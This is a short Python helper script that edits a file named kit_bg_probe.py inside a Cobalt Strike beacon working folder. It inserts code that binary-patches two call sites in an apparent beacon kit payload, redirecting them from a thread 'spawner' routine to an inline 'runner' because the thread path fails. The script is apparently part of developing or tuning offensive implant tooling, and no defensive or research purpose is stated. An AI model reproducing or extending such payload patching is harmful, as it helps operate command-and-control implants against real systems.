# -*- coding: utf-8 -*-
"""patch_probe_v4.py - probe v4: add C-28-style inline patches (0x44a1 and
0x45c5 -> call 0x3d40) to the probe kit, keep 0x4170 intact, bg config."""
import io

P = (r"C:\Users\Administrator\Desktop\cobaltstrike\cobaltstrike-beacon"
     r"\feat-post-4.9.1\tools\kit_bg_probe.py")
s = io.open(P, encoding="utf-8").read()

old = '''    j = bytes(d).find(ARGSMARK)
    assert j > 0
    hdr = (struct.pack("<i", 0x0A2A1DE0) + b"AAAA" + b"N" + b"\\x00\\x00\\x00"
           + struct.pack("<i", 1 << 20) + struct.pack("<i", len(ARGS)))
    d[j:j + 20] = hdr
    patched = bytes(d)'''
new = '''    j = bytes(d).find(ARGSMARK)
    assert j > 0
    hdr = (struct.pack("<i", 0x0A2A1DE0) + b"AAAA" + b"N" + b"\\x00\\x00\\x00"
           + struct.pack("<i", 1 << 20) + struct.pack("<i", len(ARGS)))
    d[j:j + 20] = hdr
    # C-28 inline patches: spawner call sites -> call the runner directly
    # (thread path fails with error 0x4F; inline path is proven by A4)
    off = r2o  # noqa: F821 (closed over below)
    for site in (0x44a1, 0x45c5):
        fo = off(site)
        assert d[fo] == 0xE8, hex(site)
        # original: call 0x3f00 (spawner); rel32 = 0x3f00 - (site + 5)
        oldrel = struct.unpack_from("<i", d, fo + 1)[0]
        assert site + 5 + oldrel == 0x3f00, hex(site)
        newrel = 0x3d40 - (site + 5)
        struct.pack_into("<i", d, fo + 1, newrel)
    patched = bytes(d)'''
assert old in s, "patch_kit block not found"
s = s.replace(old, new)
io.open(P, "w", encoding="utf-8", newline="").write(s)
print("probe v4 ok: inline patches added")
